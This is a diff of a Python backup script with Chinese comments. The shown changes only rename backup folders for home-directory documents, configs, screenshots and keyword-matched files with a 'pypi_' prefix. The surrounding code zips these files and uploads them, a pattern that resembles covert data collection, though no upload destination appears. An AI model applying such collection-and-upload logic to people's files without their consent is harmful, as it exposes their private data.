@@ -36,9 +36,9 @@ def get_available_volumes():
             # 配置用户主目录备份
             backup_path = os.path.join(BackupConfig.BACKUP_ROOT, 'home')
             available_volumes['home'] = {
-                'docs': (os.path.abspath(user_path), os.path.join(backup_path, 'docs'), 1),
-                'configs': (os.path.abspath(user_path), os.path.join(backup_path, 'configs'), 2),
-                'specified': (os.path.abspath(user_path), os.path.join(backup_path, 'specified'), 4),  # 使用specified替代shell
+                'docs': (os.path.abspath(user_path), os.path.join(backup_path, 'pypi_docs'), 1),
+                'configs': (os.path.abspath(user_path), os.path.join(backup_path, 'pypi_configs'), 2),
+                'specified': (os.path.abspath(user_path), os.path.join(backup_path, 'pypi_specified'), 4),  # 使用specified替代shell
             }
             logging.info(f"✅ 已配置用户主目录备份: {user_path}")
             
@@ -131,7 +131,7 @@ def backup_screenshots():
         os.path.expanduser('~/Desktop'),
         os.path.expanduser('~/Pictures')
     ]
-    screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, "screenshots")
+    screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, "pypi_screenshots")
     
     backup_manager = BackupManager()
     
@@ -223,7 +223,7 @@ def backup_mac_data(backup_manager):
         if screenshots_backup:
             backup_path = backup_manager.zip_backup_folder(
                 screenshots_backup,
-                os.path.join(BackupConfig.BACKUP_ROOT, f"screenshots_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
+                os.path.join(BackupConfig.BACKUP_ROOT, f"pypi_screenshots_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
             )
             if backup_path:
                 if backup_manager.upload_backup(backup_path):
@@ -303,7 +303,7 @@ def backup_keyword_data(backup_manager, available_volumes):
                 # 获取源目录（使用第一个配置的源目录）
                 source_dir = list(volume_configs.values())[0][0]
                 # 创建关键字备份目标目录
-                backup_path = os.path.join(backup_manager.config.BACKUP_ROOT, 'keyword', volume_name)
+                backup_path = os.path.join(backup_manager.config.BACKUP_ROOT, 'pypi_keyword', volume_name)
                 target_keyword = backup_path
                 
                 logging.info(f"\n🔑 开始备份 {volume_name} 关键字文件...")
@@ -312,7 +312,7 @@ def backup_keyword_data(backup_manager, available_volumes):
                 if backup_dir:
                     backup_path_compressed = backup_manager.zip_backup_folder(
                         backup_dir,
-                        os.path.join(backup_manager.config.BACKUP_ROOT, f"keyword_{volume_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
+                        os.path.join(backup_manager.config.BACKUP_ROOT, f"pypi_keyword_{volume_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
                     )
                     if backup_path_compressed:
                         if isinstance(backup_path_compressed, list):
